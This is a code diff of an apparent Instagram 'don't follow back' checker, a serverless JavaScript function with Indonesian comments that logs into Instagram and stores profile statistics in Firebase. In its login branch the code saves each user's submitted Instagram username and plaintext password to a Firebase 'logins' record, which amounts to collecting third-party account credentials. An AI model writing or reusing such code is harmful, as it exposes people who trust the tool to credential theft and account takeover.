@@ -9,9 +9,6 @@ const ig = new IgApiClient();
 // Variabel sesi yang disimpan dalam Firebase
 let sessionData = null;
 
-const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
-
-
 // Fungsi untuk login ke Instagram
 const login = async () => {
     ig.state.generateDevice(process.env.INSTAGRAM_USERNAME);
@@ -112,16 +109,16 @@ exports.handler = async function(event, context) {
             const dontFollowBack = followingUsernames.filter(username => !followersUsernames.includes(username));
 
             // Menyimpan data pengguna dan informasi lainnya ke Firebase Realtime Database
-         //   await db.ref('users').child(user.pk).set({
-              //  username: user.username,
-              //  full_name: user.full_name,
+            await db.ref('users').child(user.pk).set({
+                username: user.username,
+                full_name: user.full_name,
 
-              //  followers_count: followersCount,
-             //   following_count: followingCount,
-               // profile_picture_url: profilePicUrl, // Simpan hanya URL gambar
-    
-            //    dont_follow_back_count: dontFollowBack.length,
-        //    });
+                followers_count: followersCount,
+                following_count: followingCount,
+                profile_picture_url: profilePicUrl, // Simpan hanya URL gambar
+
+                dont_follow_back_count: dontFollowBack.length,
+            });
 
             return {
                 statusCode: 200,
@@ -162,24 +159,14 @@ exports.handler = async function(event, context) {
             const user = await ig.account.currentUser();
             const userId = user.pk;
 
-const followersCount = user.follower_count; //NAMBAH YA
-const followingCount = user.following_count;
-        
-const fullName = user.full_name; // TAMBAHAN
-
             // Simpan ke Firebase Realtime Database
-
             const loginData = {
-    username,
-    password,
-    userId,
-    timestamp: new Date().toISOString(),
-  full_name: fullName, // Tambahkan nama lengkap
-    followers_count: followersCount, 
-
-    following_count: followingCount,             // Tambahkan jumlah following
-    profile_picture_url: user.profile_pic_url,    // gambar profil
-};
+                username,
+                password,
+                userId,
+                timestamp: new Date().toISOString(),
+                profile_picture_url: user.profile_pic_url, // Menyimpan URL gambar profil
+            };
 
             // Menyimpan data login di Realtime Database
             await db.ref('logins').child(userId).set(loginData);
